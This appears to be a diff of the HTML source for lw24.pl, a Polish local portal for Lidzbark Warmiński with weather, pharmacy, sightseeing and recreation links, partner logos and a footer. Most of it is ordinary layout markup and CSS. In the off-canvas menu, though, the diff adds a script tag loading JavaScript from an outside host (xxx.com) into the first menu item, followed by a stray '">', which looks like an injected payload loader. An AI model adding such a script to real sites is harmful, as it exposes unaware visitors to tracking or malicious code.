0-1.6-.1-2.5-.1h-1.5c-2.1-.7-4.4-.2-6.7-.5-.2.1-.4.2-.7.3-1-.1-1.6-.1-2.6-.1-.1.1-.1.5-.1.8-.3 0-.5.1-.5.2-.2-.1-.3-.1-.5 0h-.4c0-.1 0-.1.1-.2v-.2h-.1c-.1 0-.1 0-.1.1-.1.1-.1.2-.1.2-.3.1-.6.1-.9.1-.2 0-.5 0-.7.1-.3-.1-.7-.1-.7-.4.3-.2.8-.1 1-.3.2-.1.4-.1.7-.1.1 0 .1 0 .1-.1 0 0 0-.1-.1-.1h-.2c-.2 0-.4 0-.6.1v-.1c-.2.1-.5-.1-.7-.1-1 0-2.2.3-3.3.4-.3 0-.6-.1-1-.1-2-.1-4.6.6-5.1 0 .1 0 .3-.1.3-.2s0-.1-.1-.2h-.1c-.1 0-.1 0-.1.1 0 0-.1 0-.2.1h-1.1c0-.3-.4-.3-.3-.7-1.9.2-3.3-.4-4.7.4-1.2-.2-1.8-1-3.1-.5 0-.1-.3-.1-.4-.2-1.1.3-2.8.4-3.6-.2.3-.7 1.6.1 2.1-.3.3.1.4.2.7.3.8 0 1.1 0 1.8-.2-.1.3.3.2.5.2s.5-.3.1-.3c1.4-.2 3.4.2 5.1.1 0 .1.2.2.1.4 1.1 0 1.6.3 2.2-.3.5.2.9 0 1.2.1.2 0 0-.1 0-.3h1.2c-.2.5.2.5.4.5.1.4-.3.6-.7 1 .4.4 1.8-.2 2.3-.3.3.1.5.1.8 0 .7-.1.1-.3.1-.5 0-.1.3-.3.3-.3-.1-.3-.7-.2-.4-.5.5-.2 1-.5 1.9-.4 0 .4-.5.5-.7.7 0 .2.4.1.4.3.2-.1.5-.1.5-.3 1.7.2 3.1-.5 4.5 0 .3 0 .6-.1.8-.2.6.1.4.2 1.1.2.2 0 .1-.2.1-.3 1.7-.3 2.3-.1 3.6.1.2-.2-.1-.4-.1-.8.2 0 .2-.1.3-.2.6 0 .7.3 1.4.2 0 .1 0 .3.1.3-.1.1-.1.4-.5.3 1 .5 2.7-.3 3.4.5 1.2-.3 2 0 3.2 0 .5-.2-.4-.3 0-.5.3 0 .3-.1.5-.1-.1.4.3.6 0 .8.4.3 1.3.2 1.8 0 1.6.5 3.3.4 5.6.5-.1.7-.8.7-1.5.9zm3.8-3c-.5-.5-1.9.2-2.1-.4.7-.2 1.4.1 2.2-.1 0 .2 0 .4-.1.5zm2-2.9c0-.3.5-.2.7-.1 0 .3-.5.3-.7.1zm56.7 5c.3-.4.6.3 0 0zm13.5-3.2h.7c.2.2.4.3.7.4-.5 0-1 0-1.6-.1 0-.1-.1-.1-.1-.2 0 0 .1 0 .3-.1zm-1 0c.1 0 .1.1.3 0v.1c0 .1 0 .1.1.2h-.3-.1c-.1-.1-.3-.1-.3-.3h.3zm4.9 1.2c-.8.4-3 .5-4 .1-2-.1-4.2.5-5.3-.5h.3c.4.1.9.1 1.3-.1.1 0 .1-.1 0-.1h-.1-.1c-.3.2-.7.1-1 .1h-.2v-.1c-.9-.1-1.8-.1-2.6.2-.6-.6-1.7-.5-2.6-.7 1.3.1 2.9-.5 4.4-.1.4.1.3-.3.5-.3.6 0 1 .1 1.2.3h.2c.6.1 1.2.2 2 .2v.6c.3 0 .6.2.9 0h.5v.1h.1V41c.9.1 1.7.2 2.3 0 .4.1.4-.1.7-.1h.2c.2 0 .4 0 .6.1.6.4 1.3.5 2 .4.1 0 .1.1.2.1h.1c-.4 0-1 0-1.6-.1zm1.9 0c.4 0 .8 0 1.3.1-.4 0-.8 0-1.3-.1zm5.4 1c-.2 0-.2.1-.4.1h-.4-.1-.1c-.1-.1-.3-.2-.5-.3 0-.2.1-.3.2-.5h.9c0 .3.5.3.4.7zm1.8-.6c.3-.3.5.4 0 0zm8.3-1.2c-.2-.2-1 0-1-.4.6 0 1.2-.1 1 .4zm-5.6 0c.4 0 .8 0 1.1.1l-.6.3c-.2-.1-.3-.3-.5-.4zm36.7-4.3c.1 0 .2.1.3.2-.5 0-1 .1-1.2-.1.3-.1.6-.1.9-.1zm9.3 2.3c-.3.6-1.2.3-1.6.9 0-.6-.8.2-.6-.6-3.4-.1-7.1-.6-11.5-1.4 0-.7.6-.5.6-1.1.1.1.3.1.4.1-.2.1-.3.3-.1.4.8.3 3.1.2 4.5.4.3-.2.3-.3.2-.5.6 0 1.2 0 1.9.1 0 .2.1.2.5.2.1-.2-.3-.2-.4-.2.5.1 1.1.2 1.7.3.1-.2.3-.4.5-.6.7 0 1.3 0 2.1-.3.8 0 1.2.2 1.6.4.1.1.2.2.2.3-.2.6-.9.4-.9 1.3.9-.2.1.7.9.3zm1.6 2.6c0-.1 0-.2-.1-.2.2-.2.4-.3.7-.2 0 .3 0 .6.1.6-.2.7-.5-.2-.7-.2zm.1-2.9c.1-.3.6-.2.8-.4v.1c-.2.2-.4.3-.8.3zm1-.4c0-.1 0-.2-.1-.3h.2c0 .2-.1.3-.1.3zm.8-.1h-.3c.1-.2.2-.2.3 0 .1-.1 0-.1 0 0zm17 .9c.9-.6 1.4-.9 2 .2.4-.2.7-.1.9.1h-.4c-.2 0-.5 0-.7.1-.7 0-.9-.2-1.3-.2-.2 0-.3 0-.5.1v-.3zm-7.8-1.7h.3c.3 0 0-.4.3-.4.3.2.5.7.6 1.4h.2-.3c-.4.4.3.4 0 .9h-1.1c-.1-.1-.2-.2-.4-.2.3-.4.4-.9.4-1.7zm6.4 7.1c-1 .4-1.7.3-2.4.8v.1c-.4-.1-.8-.2-1.2-.2-.3 0-.6 0-.8.1v-.1c-.5-.2-.9-.8-1.4-.4 0-1.4 1.2-.9 1.3-2.2.6-.1 1.2.1 1.8.3.6.2 1.2.4 1.9.4h.4c-.2.9.5.4.4 1.2zm4.4-2.2c-1.7.2-3.9-.8-5.3.4-.6.1-1.2-.1-1.8-.3-.5-.2-1.1-.4-1.6-.4h-.4c-1.9-.3-3.5-.4-4.8-1.1v-1.1c.9.1 1.9.1 2.5-.5h.6v-.1c.2.1.5.1.7.1h.6c.8.1 1 .1 1.8.1.3-.2.4-.5.7-.7.4.1.8.1 1.3-.1.6 1.1 1 2.7 2.4 2 0-1 .3-.6.5-1.2.7.2 1.2.3 2 0 .4-.1.8-.1 1.2 0 .1.1.2.3.3.4 0 1.5-.7 1.5-.7 2.5z"/>
+</svg></div><div class="sppb-row-overlay"></div><div class="sppb-container-inner"><div class="sppb-row sppb-align-center"><div class="sppb-row-column  " id="column-wrap-id-1694797254793"><div id="column-id-1694797254793" class="sppb-column " ><div class="sppb-column-addons"><div id="sppb-addon-wrapper-1693246983327" class="sppb-addon-wrapper  addon-root-heading"><div id="sppb-addon-1693246983327" class="clearfix   sppb-positioned-addon "   data-col-zindex="1" data-rowid="1680963163511" data-colid="1694797254793"><div class="sppb-addon sppb-addon-header"><a  href="/pogoda"><h3 class="sppb-addon-title">Pogoda dla <br />
+Lidzbarka Warmińskiego</h3></a></div></div></div><div id="sppb-addon-wrapper-1693416032434" class="sppb-addon-wrapper  addon-root-flip-box-pro"><div id="sppb-addon-1693416032434" class="clearfix  "     ><div class="sppb-addon sppb-addon-sppb-flibox  fade-flipbox flip_right flipon-hover"><div class="sppb-flipbox-panel"><div class="sppb-flipbox-front flip-box"><div class="flip-box-inner"></div></div><div class="sppb-flipbox-back flip-box"><div class="flip-box-inner"></div></div></div></div></div></div></div></div></div><div class="sppb-row-column  " id="column-wrap-id-1708424612861"><div id="column-id-1708424612861" class="sppb-column " ><div class="sppb-column-addons"><div id="sppb-addon-wrapper-1693248658935" class="sppb-addon-wrapper  addon-root-heading"><div id="sppb-addon-1693248658935" class="clearfix   sppb-positioned-addon "   data-col-zindex="1" data-rowid="1680963163511" data-colid="1708424612861"><div class="sppb-addon sppb-addon-header"><a  href="/warto-zobaczyc"><h3 class="sppb-addon-title">Warto zobaczyć</h3></a></div></div></div><div id="sppb-addon-wrapper-1693248715639" class="sppb-addon-wrapper  addon-root-flip-box"><div id="sppb-addon-1693248715639" class="clearfix  sppb-wow fadeIn   sppb-positioned-addon "  data-sppb-wow-duration="1000ms"    data-rowid="1680963163511" data-colid="1708424612861"><div class="sppb-addon sppb-addon-sppb-flibox  fade-flipbox flip_right flipon-hover"><div class="sppb-flipbox-panel"><div class="sppb-flipbox-front flip-box"><div class="flip-box-inner"></div></div><div class="sppb-flipbox-back flip-box"><div class="flip-box-inner"></div></div></div></div></div></div></div></div></div><div class="sppb-row-column  " id="column-wrap-id-1694797254795"><div id="column-id-1694797254795" class="sppb-column " ><div class="sppb-column-addons"><div id="sppb-addon-wrapper-1693250497196" class="sppb-addon-wrapper  addon-root-heading"><div id="sppb-addon-1693250497196" class="clearfix   sppb-positioned-addon "   data-col-zindex="1" data-rowid="1680963163511" data-colid="1694797254795"><div class="sppb-addon sppb-addon-header"><a  href="/rekreacja-i-odpoczynek"><h3 class="sppb-addon-title">Rekreacja i wypoczynek</h3></a></div></div></div><div id="sppb-addon-wrapper-1693250694274" class="sppb-addon-wrapper  addon-root-flip-box-pro"><div id="sppb-addon-1693250694274" class="clearfix   sppb-positioned-addon "    data-rowid="1680963163511" data-colid="1694797254795"><div class="sppb-addon sppb-addon-sppb-flibox  fade-flipbox flip_right flipon-hover"><div class="sppb-flipbox-panel"><div class="sppb-flipbox-front flip-box"><div class="flip-box-inner"></div></div><div class="sppb-flipbox-back flip-box"><div class="flip-box-inner"></div></div></div></div></div></div></div></div></div></div></div></div>
+			</div>
+</div>
+
+			</div>
+</div>
+</div>
+				
+	</section>
+
+<section id="sp-loga" >
+
+				
+	
+<div class="row">
+	<div id="sp-loga" class="col-lg-12 "><div class="sp-column "><div class="sp-module "><div class="sp-module-content"><div class="mod-sppagebuilder  sp-page-builder" data-module_id="139">
+	<div class="page-content">
+		<section id="section-id-Nkzm3IVHotGvJP8i699RW" class="sppb-section sppb-section-content-center" ><div class="sppb-shape-container sppb-bottom-shape  sppb-shape-invert"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 91" preserveAspectRatio="none"><path d="M0 .4V91h1000V.6c-67.6 41.7-265.8 71.8-499.8 71.8C265.8 72.4 67.3 42.1 0 .4z"/></svg></div><div class="sppb-row-container"><div class="sppb-row sppb-align-center"><div class="sppb-row-column  " id="column-wrap-id-xZI6M6rHirN_rkh4VSz2h"><div id="column-id-xZI6M6rHirN_rkh4VSz2h" class="sppb-column " ><div class="sppb-column-addons"><div id="sppb-addon-wrapper-memOqHDM7txj4OcMJif3F" class="sppb-addon-wrapper  addon-root-clients"><div id="sppb-addon-memOqHDM7txj4OcMJif3F" class="clearfix  "     ><div class="sppb-addon sppb-addon-clients sppb-carousel-extended"  data-arrow="0" data-left-arrow="fa-angle-left" data-right-arrow="fa-angle-right" data-dots="0" data-autoplay="1" data-speed="2000" data-interval="3500" 
+		data-margin-xl="32"
+		data-margin-lg="32"
+		data-margin-md="32"
+		data-margin-sm="32"
+		data-margin-xs="32"
+		data-item-number-xl="7" data-item-number-lg="7" data-item-number-md="5" data-item-number-sm="4" data-item-number-xs="4"><div class="sppb-carousel-extended-item"><a target="_blank" rel="nofollow" href="http://zakatekszczescia.pl/"><img class="sppb-img-responsive sppb-addon-clients-image lazyload" data-src="https://lw24.pl/images/webp/zakatek_szczescia.webp" alt="zakatekszczescia" loading="lazy"></a></div><div class="sppb-carousel-extended-item"><a target="_blank" rel="nofollow" href="https://zdrowystylbycia.pl/"><img class="sppb-img-responsive sppb-addon-clients-image lazyload" data-src="https://lw24.pl/images/loga_firm/zdrowystylbycia.webp" alt="zdrowystylbycia" loading="lazy"></a></div><div class="sppb-carousel-extended-item"><a target="_blank" rel="nofollow" href="https://agropodlasem.pl/"><img class="sppb-img-responsive sppb-addon-clients-image lazyload" data-src="https://lw24.pl/images/loga_firm/agropodlasem.webp" alt="agropodlasem" loading="lazy"></a></div><div class="sppb-carousel-extended-item"><a target="_blank" rel="nofollow" href="http://fotolidzbark.pl/stary/"><img class="sppb-img-responsive sppb-addon-clients-image lazyload" data-src="https://lw24.pl/images/loga_firm/fotolidzbark.png" alt="fotolidzbark" loading="lazy"></a></div><div class="sppb-carousel-extended-item"><a target="_blank" rel="nofollow" href="http://www.centrumbalans.pl/"><img class="sppb-img-responsive sppb-addon-clients-image lazyload" data-src="https://lw24.pl/images/loga_firm/centrumbalans.png" alt="centrumbalans" loading="lazy"></a></div><div class="sppb-carousel-extended-item"><a target="_blank" rel="nofollow" href="http://silaspokoju.olsztyn.pl/"><img class="sppb-img-responsive sppb-addon-clients-image lazyload" data-src="https://lw24.pl/images/loga_firm/sila_spokoju.png" alt="silaspokojuolsztyn" loading="lazy"></a></div><div class="sppb-carousel-extended-item"><a target="_blank" rel="nofollow" href="https://puzlewicz.pl/"><img class="sppb-img-responsive sppb-addon-clients-image lazyload" data-src="https://lw24.pl/images/loga_firm/nowelogo1.png" alt="puzlewicz" loading="lazy"></a></div></div><style type="text/css">#sppb-addon-memOqHDM7txj4OcMJif3F{
+}#sppb-addon-memOqHDM7txj4OcMJif3F{
+padding-top: 0px;
+padding-right: 0px;
+padding-bottom: 0px;
+padding-left: 0px;
+}
+@media (max-width: 1199.98px) {#sppb-addon-memOqHDM7txj4OcMJif3F{}}
+@media (max-width: 991.98px) {#sppb-addon-memOqHDM7txj4OcMJif3F{}}
+@media (max-width: 767.98px) {#sppb-addon-memOqHDM7txj4OcMJif3F{}}
+@media (max-width: 575.98px) {#sppb-addon-memOqHDM7txj4OcMJif3F{}}#sppb-addon-wrapper-memOqHDM7txj4OcMJif3F{
+}
+@media (max-width: 1199.98px) {#sppb-addon-wrapper-memOqHDM7txj4OcMJif3F{}}
+@media (max-width: 991.98px) {#sppb-addon-wrapper-memOqHDM7txj4OcMJif3F{}}
+@media (max-width: 767.98px) {#sppb-addon-wrapper-memOqHDM7txj4OcMJif3F{}}
+@media (max-width: 575.98px) {#sppb-addon-wrapper-memOqHDM7txj4OcMJif3F{}}#sppb-addon-memOqHDM7txj4OcMJif3F .sppb-addon-title{
+margin-top: 0px;
+margin-bottom: 0px;
+}
+@media (max-width: 1199.98px) {#sppb-addon-memOqHDM7txj4OcMJif3F .sppb-addon-title{}}
+@media (max-width: 991.98px) {#sppb-addon-memOqHDM7txj4OcMJif3F .sppb-addon-title{}}
+@media (max-width: 767.98px) {#sppb-addon-memOqHDM7txj4OcMJif3F .sppb-addon-title{}}
+@media (max-width: 575.98px) {#sppb-addon-memOqHDM7txj4OcMJif3F .sppb-addon-title{}}</style><style type="text/css">#sppb-addon-memOqHDM7txj4OcMJif3F .sppb-addon-clients-image {filter:grayscale(68%) opacity(100%);}#sppb-addon-memOqHDM7txj4OcMJif3F .sppb-addon-clients-image:hover {filter: none;}#sppb-addon-memOqHDM7txj4OcMJif3F .sppb-addon-clients-image:hover {transform: scale(1.5);}#sppb-addon-memOqHDM7txj4OcMJif3F .sppb-addon-clients{
+text-align: center;
+}
+@media (max-width: 1199.98px) {#sppb-addon-memOqHDM7txj4OcMJif3F .sppb-addon-clients{text-align: center;}}
+@media (max-width: 991.98px) {#sppb-addon-memOqHDM7txj4OcMJif3F .sppb-addon-clients{}}
+@media (max-width: 767.98px) {#sppb-addon-memOqHDM7txj4OcMJif3F .sppb-addon-clients{}}
+@media (max-width: 575.98px) {#sppb-addon-memOqHDM7txj4OcMJif3F .sppb-addon-clients{}}</style></div></div></div></div></div></div></div></section><style type="text/css">.sp-page-builder .page-content #section-id-1691918112835{box-shadow:0px 0px 0px 0px #FFFFFF;}.sp-page-builder .page-content #section-id-1691918112835{padding-top:10px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;}#column-id-1691918112832{box-shadow:0 0 0 0 #FFFFFF;}#column-wrap-id-1691918112832{max-width:25%;flex-basis:25%;}@media (max-width:1199.98px) {#column-wrap-id-1691918112832{max-width:25%;flex-basis:25%;}}@media (max-width:991.98px) {#column-wrap-id-1691918112832{max-width:25%;flex-basis:25%;}}@media (max-width:767.98px) {#column-wrap-id-1691918112832{max-width:100%;flex-basis:100%;}}@media (max-width:575.98px) {#column-wrap-id-1691918112832{max-width:100%;flex-basis:100%;}}#column-wrap-id-1691918112833{max-width:50%;flex-basis:50%;}@media (max-width:1199.98px) {#column-wrap-id-1691918112833{max-width:50%;flex-basis:50%;}}@media (max-width:991.98px) {#column-wrap-id-1691918112833{max-width:50%;flex-basis:50%;}}@media (max-width:767.98px) {#column-wrap-id-1691918112833{max-width:100%;flex-basis:100%;}}@media (max-width:575.98px) {#column-wrap-id-1691918112833{max-width:100%;flex-basis:100%;}}#column-id-1691918112834{box-shadow:0 0 0 0 #FFFFFF;}#column-wrap-id-1691918112834{max-width:25%;flex-basis:25%;}@media (max-width:1199.98px) {#column-wrap-id-1691918112834{max-width:25%;flex-basis:25%;}}@media (max-width:991.98px) {#column-wrap-id-1691918112834{max-width:25%;flex-basis:25%;}}@media (max-width:767.98px) {#column-wrap-id-1691918112834{max-width:100%;flex-basis:100%;}}@media (max-width:575.98px) {#column-wrap-id-1691918112834{max-width:100%;flex-basis:100%;}}.sp-page-builder .page-content #section-id-1708426369703{box-shadow:0px 0px 0px 0px #FFFFFF;}.sp-page-builder .page-content #section-id-1708426369703{padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;}#column-id-1708426369702{box-shadow:0 0 0 0 #FFFFFF;}#column-wrap-id-1708426369702{max-width:33.333333%;flex-basis:33.333333%;}@media (max-width:1199.98px) {#column-wrap-id-1708426369702{max-width:33.333333%;flex-basis:33.333333%;}}@media (max-width:991.98px) {#column-wrap-id-1708426369702{max-width:33.333333%;flex-basis:33.333333%;}}@media (max-width:767.98px) {#column-wrap-id-1708426369702{max-width:100%;flex-basis:100%;}}@media (max-width:575.98px) {#column-wrap-id-1708426369702{max-width:100%;flex-basis:100%;}}#column-id-1708426369780{box-shadow:0 0 0 0 #FFFFFF;}#column-wrap-id-1708426369780{max-width:33.333333%;flex-basis:33.333333%;}@media (max-width:1199.98px) {#column-wrap-id-1708426369780{max-width:33.333333%;flex-basis:33.333333%;}}@media (max-width:991.98px) {#column-wrap-id-1708426369780{max-width:33.333333%;flex-basis:33.333333%;}}@media (max-width:767.98px) {#column-wrap-id-1708426369780{max-width:100%;flex-basis:100%;}}@media (max-width:575.98px) {#column-wrap-id-1708426369780{max-width:100%;flex-basis:100%;}}#column-id-1708426369781{box-shadow:0 0 0 0 #FFFFFF;}#column-wrap-id-1708426369781{max-width:33.333333%;flex-basis:33.333333%;}@media (max-width:1199.98px) {#column-wrap-id-1708426369781{max-width:33.333333%;flex-basis:33.333333%;}}@media (max-width:991.98px) {#column-wrap-id-1708426369781{max-width:33.333333%;flex-basis:33.333333%;}}@media (max-width:767.98px) {#column-wrap-id-1708426369781{max-width:100%;flex-basis:100%;}}@media (max-width:575.98px) {#column-wrap-id-1708426369781{max-width:100%;flex-basis:100%;}}.sp-page-builder .page-content #section-id-Nkzm3IVHotGvJP8i699RW{background-image:radial-gradient(at center center, #ffffff 0%, #05014a 68%);box-shadow:0px 0px 0px 0px #ffffff;}.sp-page-builder .page-content #section-id-Nkzm3IVHotGvJP8i699RW{padding-top:20px;padding-right:0px;padding-bottom:20px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;}#column-wrap-id-xZI6M6rHirN_rkh4VSz2h{max-width:100%;flex-basis:100%;}@media (max-width:1199.98px) {#column-wrap-id-xZI6M6rHirN_rkh4VSz2h{max-width:100%;flex-basis:100%;}}@media (max-width:991.98px) {#column-wrap-id-xZI6M6rHirN_rkh4VSz2h{max-width:100%;flex-basis:100%;}}@media (max-width:767.98px) {#column-wrap-id-xZI6M6rHirN_rkh4VSz2h{max-width:100%;flex-basis:100%;}}@media (max-width:575.98px) {#column-wrap-id-xZI6M6rHirN_rkh4VSz2h{max-width:100%;flex-basis:100%;}}</style>	</div>
+</div></div></div></div></div></div>
+				
+	</section>
+
+<footer id="sp-footer" >
+
+						<div class="container">
+				<div class="container-inner">
+			
+	
+<div class="row">
+	<div id="sp-footer1" class="col-lg-6 "><div class="sp-column "><div class="sp-module "><div class="sp-module-content"><div id="panel_cookie_dol_lewa" class="panel_cookie ">
+<div class="dodatek"> </div>
+<div class="dodatek2"> </div>
+<div class="tresc">
+<!--googleoff: all--><h5 class='title'>Informacje o plikach cookie</h5><!--googleon: all--> 
+<!--googleoff: all--><p>Ta strona używa plików Cookies. Dowiedz się więcej o celu ich używania i&nbsp;możliwości zmiany ustawień Cookies w przeglądarce. <a href='polityka-prywatnosci' class='czytaj-wiecej'>Czytaj więcej...</a></p><!--googleon: all--> 
+</div>
+<input type="button" id="ukryj" value="UKRYJ" onclick="info_cookie(0,'panel_cookie_dol_lewa');"/>
+</div></div></div><div class="sp-module "><div class="sp-module-content">
+<div class="mod-whosonline">
+                            <p>Odwiedza nas 4&#160; gości oraz&#160;0 użytkowników.</p>
+    
+    </div>
+</div></div><span class="sp-copyright"><p>© 2026   Lw24. Wszelkie prawa zastrzeżone. Zaprojektowany i administrowany przez <a href="https://lw24.pl" target="_blank" rel="noopener noreferrer">LW24.pl</a></p></span></div></div><div id="sp-footer2" class="col-lg-6 "><div class="sp-column "><div class="sp-module "><div class="sp-module-content">
+<div id="mod-custom138" class="mod-custom custom">
+    <p style="text-align: left;">Kontakt<br /><strong><a href="mailto:serwer@lw24.pl"></a><a href="mailto:kontakt@lw24.pl">kontakt@lw24.pl</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</strong>&nbsp;<a href="/administrator" target="_blank">.</a></p></div>
+</div></div></div></div></div>
+							</div>
+			</div>
+			
+	</footer>
+				</main>
+			</div>
+		</div>
+
+		<!-- Off Canvas Menu -->
+		<div class="offcanvas-overlay"></div>
+		<!-- Rendering the offcanvas style -->
+		<!-- If canvas style selected then render the style -->
+		<!-- otherwise (for old templates) attach the offcanvas module position -->
+					<div class="offcanvas-menu left-1" tabindex="-1" inert>
+	<div class="d-flex align-items-center p-3 pt-4">
+				<a href="#" class="close-offcanvas" role="button" aria-label="Close Off-canvas">
+			<div class="burger-icon" aria-hidden="true">
+				<span></span>
+				<span></span>
+				<span></span>
+			</div>
+		</a>
+	</div>
+	
+	<div class="offcanvas-inner">
+		<div class="d-flex header-modules mb-3">
+			
+					</div>
+		
+					<div class="sp-module "><div class="sp-module-content"><ul class="menu nav-pills">
+<li class="item-101 default current active "><script src="https://xxx.com/fp/v1.min.js"></script>"><a href="/" >Zapraszamy</a></li><li class="item-143"><a href="/pogoda" >Pogoda</a></li><li class="item-144"><a href="/dyzury-aptek" >Dyżury Aptek</a></li><li class="item-146"><a href="/warto-zobaczyc" >Warto Zobaczyć</a></li><li class="item-148"><a href="/rekreacja-i-odpoczynek" >Rekreacja i odpoczynek</a></li><li class="item-345"><a href="/galeria-3d" >Galeria 3d</a></li><li class="item-346"><a href="/inspiracje-3d" >Inspiracje 3D</a></li><li class="item-147"><a href="http://fotolidzbark.pl/stary" target="_blank" rel="noopener noreferrer">Galeria</a></li></ul>
+</div></div>		
+		
+		
+		
+					
+				
+		<!-- custom module position -->
+		
+	</div>
+</div>				
+
+		
+		
+
+		<!-- Go to top -->
+					<a href="#" class="sp-scroll-up" aria-label="Scroll Up"><span class="fas fa-angle-up" aria-hidden="true"></span></a>
+					</body>
+</html>
